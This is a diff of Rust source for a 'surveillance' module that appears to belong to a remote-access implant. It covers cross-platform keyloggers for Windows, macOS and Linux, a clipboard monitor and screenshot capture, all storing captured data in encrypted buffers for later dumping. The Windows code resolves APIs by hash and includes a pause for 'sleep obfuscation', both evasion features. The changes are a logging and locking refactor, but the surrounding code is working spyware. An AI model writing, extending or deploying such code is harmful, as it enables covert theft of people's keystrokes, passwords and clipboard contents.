@@ -21,10 +21,11 @@
 
 #![cfg(feature = "surveillance")]
 
+use common::lock::MutexExt;
 use anyhow::{anyhow, Result};
 use chacha20poly1305::aead::{Aead, KeyInit};
 use chacha20poly1305::{ChaCha20Poly1305, Nonce};
-use lazy_static::lazy_static;
+use once_cell::sync::Lazy;
 #[cfg(target_os = "macos")]
 use std::ffi::c_void;
 #[cfg(target_os = "windows")]
@@ -280,19 +281,15 @@ const DEFAULT_CLIPBOARD_INTERVAL_MS: u64 = 1000;
 
 // ── Shared state ───────────────────────────────────────────────────────────────
 
-lazy_static! {
-    /// Keylogger state — `None` means not started.
-    static ref KEYLOGGER_STATE: Arc<Mutex<Option<KeyloggerState>>> =
-        Arc::new(Mutex::new(None));
-    /// Clipboard monitor state — `None` means not started.
-    static ref CLIPBOARD_STATE: Arc<Mutex<Option<ClipboardState>>> =
-        Arc::new(Mutex::new(None));
-}
+/// Keylogger state — `None` means not started.
+static KEYLOGGER_STATE: Lazy<Arc<Mutex<Option<KeyloggerState>>>> =
+    Lazy::new(|| Arc::new(Mutex::new(None)));
+/// Clipboard monitor state — `None` means not started.
+static CLIPBOARD_STATE: Lazy<Arc<Mutex<Option<ClipboardState>>>> =
+    Lazy::new(|| Arc::new(Mutex::new(None)));
 
 #[cfg(target_os = "macos")]
-lazy_static! {
-    static ref MAC_KEYLOGGER_BUFFER: Mutex<Option<Arc<Mutex<EncryptedBuffer>>>> = Mutex::new(None);
-}
+static MAC_KEYLOGGER_BUFFER: Lazy<Mutex<Option<Arc<Mutex<EncryptedBuffer>>>>> = Lazy::new(|| Mutex::new(None));
 
 #[cfg(target_os = "macos")]
 static MAC_KEYLOGGER_ACTIVE: AtomicBool = AtomicBool::new(false);
@@ -547,7 +544,7 @@ fn capture_screenshot_linux() -> Result<Vec<u8>> {
         if std::env::var_os("DISPLAY").is_some() {
             match crate::remote_assist::capture_screen() {
                 Ok(data) => return Ok(data),
-                Err(e) => log::warn!("X11 screenshot failed: {}", e),
+                Err(e) => tracing::warn!("X11 screenshot failed: {}", e),
             }
         }
     }
@@ -562,7 +559,7 @@ fn capture_screenshot_macos() -> Result<Vec<u8>> {
     {
         match crate::remote_assist::capture_screen() {
             Ok(data) => return Ok(data),
-            Err(e) => log::warn!("macOS screenshot via remote_assist failed: {}", e),
+            Err(e) => tracing::warn!("macOS screenshot via remote_assist failed: {}", e),
         }
     }
 
@@ -616,7 +613,7 @@ struct KeyloggerState {
 /// encrypt the keystroke buffer.
 pub fn start_keylogger(key: [u8; 32]) -> Result<()> {
     #[allow(unused_mut)]
-    let mut guard = KEYLOGGER_STATE.lock().unwrap();
+    let mut guard = KEYLOGGER_STATE.lock_recover();
     if guard.is_some() {
         return Err(anyhow!("keylogger already running"));
     }
@@ -624,7 +621,7 @@ pub fn start_keylogger(key: [u8; 32]) -> Result<()> {
     #[cfg(target_os = "macos")]
     {
         if unsafe { !AXIsProcessTrusted() } {
-            log::warn!(
+            tracing::warn!(
                 "surveillance: macOS Accessibility permission is not granted; key capture may fail"
             );
         }
@@ -693,10 +690,10 @@ pub fn start_keylogger(key: [u8; 32]) -> Result<()> {
 /// Dump the current keylogger buffer.  If `clear` is true the buffer is
 /// drained after reading.  Returns encrypted bytes (`nonce(12) || ciphertext`).
 pub fn dump_keylogger(key: [u8; 32], clear: bool) -> Result<Vec<u8>> {
-    let guard = KEYLOGGER_STATE.lock().unwrap();
+    let guard = KEYLOGGER_STATE.lock_recover();
     match guard.as_ref() {
         Some(state) => {
-            let mut buf = state.buffer.lock().unwrap();
+            let mut buf = state.buffer.lock_recover();
             buf.drain_encrypted(&key, clear)
         }
         None => Err(anyhow!("keylogger not running")),
@@ -705,7 +702,7 @@ pub fn dump_keylogger(key: [u8; 32], clear: bool) -> Result<Vec<u8>> {
 
 /// Stop the keylogger and clean up resources.
 pub fn stop_keylogger() -> Result<()> {
-    let mut guard = KEYLOGGER_STATE.lock().unwrap();
+    let mut guard = KEYLOGGER_STATE.lock_recover();
     match guard.take() {
         Some(mut state) => {
             state.running.store(false, Ordering::SeqCst);
@@ -730,7 +727,7 @@ pub fn stop_keylogger() -> Result<()> {
 /// Pause the keylogger hook (for sleep obfuscation).  Signals the hook
 /// callback to stop recording keystrokes.
 pub fn pause_keylogger() -> Result<()> {
-    let guard = KEYLOGGER_STATE.lock().unwrap();
+    let guard = KEYLOGGER_STATE.lock_recover();
     match guard.as_ref() {
         Some(state) => {
             state.running.store(false, Ordering::SeqCst);
@@ -748,7 +745,7 @@ pub fn pause_keylogger() -> Result<()> {
 
 /// Resume the keylogger after a pause.  Re-enables keystroke recording.
 pub fn resume_keylogger() -> Result<()> {
-    let guard = KEYLOGGER_STATE.lock().unwrap();
+    let guard = KEYLOGGER_STATE.lock_recover();
     match guard.as_ref() {
         Some(state) => {
             state.running.store(true, Ordering::SeqCst);
@@ -826,7 +823,7 @@ fn start_keylogger_thread_macos() {
             );
 
             if tap.is_null() {
-                log::error!(
+                tracing::error!(
                     "surveillance: CGEventTapCreate failed; Accessibility permission may be missing"
                 );
                 MAC_KEYLOGGER_LISTENER_STARTED.store(false, Ordering::SeqCst);
@@ -836,7 +833,7 @@ fn start_keylogger_thread_macos() {
             let run_loop = CFRunLoopGetCurrent();
             let source = CFMachPortCreateRunLoopSource(std::ptr::null(), tap, 0);
             if source.is_null() {
-                log::error!("surveillance: failed to create CFRunLoop source for keylogger");
+                tracing::error!("surveillance: failed to create CFRunLoop source for keylogger");
                 CFRelease(tap as *const c_void);
                 MAC_KEYLOGGER_LISTENER_STARTED.store(false, Ordering::SeqCst);
                 return;
@@ -879,11 +876,11 @@ fn start_keylogger_thread_linux(
         // 1. Enumerate keyboard devices from /dev/input/eventX
         let devices = enumerate_evdev_keyboards();
         if devices.is_empty() {
-            log::error!("surveillance: no keyboard evdev devices found (need root or input group)");
+            tracing::error!("surveillance: no keyboard evdev devices found (need root or input group)");
             return;
         }
 
-        log::info!(
+        tracing::info!(
             "surveillance: linux keylogger opened {} keyboard device(s)",
             devices.len()
         );
@@ -964,7 +961,7 @@ fn enumerate_evdev_keyboards() -> Vec<(libc::c_int, String)> {
     let dev_input = match std::fs::read_dir("/dev/input") {
         Ok(d) => d,
         Err(e) => {
-            log::warn!("surveillance: cannot read /dev/input: {}", e);
+            tracing::warn!("surveillance: cannot read /dev/input: {}", e);
             return keyboards;
         }
     };
@@ -1047,7 +1044,7 @@ fn start_keylogger_thread_windows(
             match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_CALLNEXTHOOKEX) {
                 Ok(f) => f,
                 Err(e) => {
-                    log::error!("surveillance: CallNextHookEx resolution failed: {}", e);
+                    tracing::error!("surveillance: CallNextHookEx resolution failed: {}", e);
                     return;
                 }
             }
@@ -1056,7 +1053,7 @@ fn start_keylogger_thread_windows(
             match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_SETWINDOWSHOOKEXW) {
                 Ok(f) => f,
                 Err(e) => {
-                    log::error!("surveillance: SetWindowsHookExW resolution failed: {}", e);
+                    tracing::error!("surveillance: SetWindowsHookExW resolution failed: {}", e);
                     return;
                 }
             }
@@ -1065,7 +1062,7 @@ fn start_keylogger_thread_windows(
             match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_PEEKMESSAGEW) {
                 Ok(f) => f,
                 Err(e) => {
-                    log::error!("surveillance: PeekMessageW resolution failed: {}", e);
+                    tracing::error!("surveillance: PeekMessageW resolution failed: {}", e);
                     return;
                 }
             }
@@ -1074,7 +1071,7 @@ fn start_keylogger_thread_windows(
             match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_TRANSLATEMESSAGE) {
                 Ok(f) => f,
                 Err(e) => {
-                    log::error!("surveillance: TranslateMessage resolution failed: {}", e);
+                    tracing::error!("surveillance: TranslateMessage resolution failed: {}", e);
                     return;
                 }
             }
@@ -1083,7 +1080,7 @@ fn start_keylogger_thread_windows(
             match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_DISPATCHMESSAGEW) {
                 Ok(f) => f,
                 Err(e) => {
-                    log::error!("surveillance: DispatchMessageW resolution failed: {}", e);
+                    tracing::error!("surveillance: DispatchMessageW resolution failed: {}", e);
                     return;
                 }
             }
@@ -1092,7 +1089,7 @@ fn start_keylogger_thread_windows(
             match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_UNHOOKWINDOWSHOOKEX) {
                 Ok(f) => f,
                 Err(e) => {
-                    log::error!("surveillance: UnhookWindowsHookEx resolution failed: {}", e);
+                    tracing::error!("surveillance: UnhookWindowsHookEx resolution failed: {}", e);
                     return;
                 }
             }
@@ -1101,7 +1098,7 @@ fn start_keylogger_thread_windows(
             match resolve_api(pe_resolve::HASH_KERNEL32_DLL, HASH_GETMODULEHANDLEW) {
                 Ok(f) => f,
                 Err(e) => {
-                    log::error!("surveillance: GetModuleHandleW resolution failed: {}", e);
+                    tracing::error!("surveillance: GetModuleHandleW resolution failed: {}", e);
                     return;
                 }
             }
@@ -1154,7 +1151,7 @@ fn start_keylogger_thread_windows(
             );
 
             if hook.is_null() {
-                log::error!("surveillance: SetWindowsHookExW failed");
+                tracing::error!("surveillance: SetWindowsHookExW failed");
                 HOOK_BUFFER_PTR.store(0, Ordering::SeqCst);
                 CALLNEXTHOOK_PTR.store(0, Ordering::SeqCst);
                 return;
@@ -1201,7 +1198,7 @@ struct ClipboardState {
 /// Start the clipboard monitor.  `key` is the 32-byte ChaCha20-Poly1305 key.
 /// `interval_ms` is the polling interval (default 1000ms if `None`).
 pub fn start_clipboard_monitor(key: [u8; 32], interval_ms: Option<u64>) -> Result<()> {
-    let mut guard = CLIPBOARD_STATE.lock().unwrap();
+    let mut guard = CLIPBOARD_STATE.lock_recover();
     if guard.is_some() {
         return Err(anyhow!("clipboard monitor already running"));
     }
@@ -1266,10 +1263,10 @@ pub fn start_clipboard_monitor(key: [u8; 32], interval_ms: Option<u64>) -> Resul
 /// Dump the current clipboard monitor buffer.  If `clear` is true the buffer
 /// is drained.  Returns encrypted bytes (`nonce(12) || ciphertext`).
 pub fn dump_clipboard(key: [u8; 32], clear: bool) -> Result<Vec<u8>> {
-    let guard = CLIPBOARD_STATE.lock().unwrap();
+    let guard = CLIPBOARD_STATE.lock_recover();
     match guard.as_ref() {
         Some(state) => {
-            let mut buf = state.buffer.lock().unwrap();
+            let mut buf = state.buffer.lock_recover();
             buf.drain_encrypted(&key, clear)
         }
         None => Err(anyhow!("clipboard monitor not running")),
@@ -1278,7 +1275,7 @@ pub fn dump_clipboard(key: [u8; 32], clear: bool) -> Result<Vec<u8>> {
 
 /// Stop the clipboard monitor and clean up.
 pub fn stop_clipboard_monitor() -> Result<()> {
-    let mut guard = CLIPBOARD_STATE.lock().unwrap();
+    let mut guard = CLIPBOARD_STATE.lock_recover();
     match guard.take() {
         Some(mut state) => {
             state.running.store(false, Ordering::SeqCst);
